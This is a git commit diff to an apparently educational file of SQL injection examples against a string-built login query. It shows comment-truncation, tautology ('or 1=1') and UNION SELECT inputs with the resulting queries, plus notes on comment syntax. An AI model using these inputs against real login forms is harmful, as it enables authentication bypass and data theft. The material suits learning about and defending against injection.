19d83cc1a2d8a4dbbc8f66b36c69ee836e2c746d
ArthurA14 <77979858+ArthurA14@users.noreply.github.com>
2022-03-24 23:34:41 +0100

    Update sql_injections_examples.sql

--- sql_injections_examples.sql
+++ sql_injections_examples.sql
@@ -6,31 +6,37 @@
 SELECT * FROM users WHERE username = '{username}' and password = '{password}';
 
 
--- Inserting    JaaOuT    username instead of {username}
--- JaaOuT' --
+-- Inserting    JaaOuT' --    username instead of {username}
+--      JaaOuT' --      in SQL
+--      JaaOuT' #       in Python 
 SELECT * FROM users WHERE username = '{username}' and password = '{password}';
 SELECT * FROM users WHERE username = 'JaaOuT' --' and password = '{password}';
 
 
 -- Inserting    ' or '' = '    instead of {username} and {password}
--- ' or '' = '
+--      ' or '' = '     in SQL
+--      ' or '' = '     in Python
 SELECT * FROM users WHERE username = '{username}' and password = '{password}';
 SELECT * FROM users WHERE username = '' or '' = '' and password = '' or '' = '';
 
 
 -- Inserting    ' or '1' = '1    instead of {username} and {password}
--- ' or '1' = '1
+--      ' or '1' = '1   in SQL
+--      ' or '1' = '1   in Python
 SELECT * FROM users WHERE username = '{username}' and password = '{password}';
 SELECT * FROM users WHERE username = '' or '1' = '1' and password = '' or '1' = '1';
 
 
 -- Inserting    ' UNION SELECT * FROM users --     instead of {username}
--- ' UNION SELECT * FROM users -- 
+--      ' UNION SELECT * FROM users --      in SQL
+--      ' UNION SELECT * FROM users #       in Python 
 SELECT * FROM users WHERE username = '{username}' and password = '{password}';
 SELECT * FROM users WHERE username = '' UNION SELECT * FROM users -- and password = '{password}';
 
 
-
-
-
-        
+-- Inserting    ' or '' = '    instead of {username} and    ' or '1' = '1      instead of {password}
+--      ' or '' = '     
+--      ' or '1' = '1    
+SELECT * FROM users WHERE username = '{username}' and password = '{password}';
+SELECT * FROM users WHERE username = '' or '' = '' and password = '' or '1' = '1';
+      
